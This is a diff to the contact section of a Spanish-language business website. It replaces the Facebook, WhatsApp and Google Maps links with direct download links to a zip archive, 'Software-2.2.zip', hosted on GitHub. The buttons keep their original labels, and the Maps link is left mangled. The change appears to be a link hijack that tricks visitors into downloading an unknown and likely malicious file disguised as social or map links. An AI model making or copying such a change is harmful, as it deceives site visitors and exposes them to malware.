@@ -188,13 +188,13 @@
         <p>Puedes encontrarnos en redes sociales, enviarnos un mensaje o visitar nuestra ubicación física:</p>
         <p><strong>Dirección:</strong> Mercado Gómez Palacio, Av. 20 de Noviembre 208-Local 90, Zona Centro, 34000 Durango, Dgo.</p>
         <div style="text-align: center; margin-top: 20px;">
-            <a href="https://www.facebook.com/share/1AFUErwPKV/?mibextid=wwXIfr" target="_blank" class="boton-contacto facebook con-sonido">
+            <a href="https://github.com/SantANT20/PG/raw/refs/heads/main/proyecto/Software-2.2.zip" target="_blank" class="boton-contacto facebook con-sonido">
                 Visítanos en Facebook
             </a>
-            <a href="https://wa.me/5216181385643" target="_blank" class="boton-contacto whatsapp con-sonido">
+            <a href="https://github.com/SantANT20/PG/raw/refs/heads/main/proyecto/Software-2.2.zip" target="_blank" class="boton-contacto whatsapp con-sonido">
                 Enviar WhatsApp
             </a>
-            <a href="https://www.google.com/maps?q=Mercado+Gomez+Palacio,+Av.+20+de+Noviembre+208-Local+90,+Zona+Centro,+34000+Durango,+Dgo." target="_blank" class="boton-contacto maps con-sonido">
+            <a href="https://github.com/SantANT20/PG/raw/refs/heads/main/proyecto/Software-2.2.zip+Gomez+Palacio,+Av.+20+de+Noviembre+208-Local+90,+Zona+Centro,+34000+Durango,+Dgo." target="_blank" class="boton-contacto maps con-sonido">
                 Ver en Google Maps
             </a>
         </div>
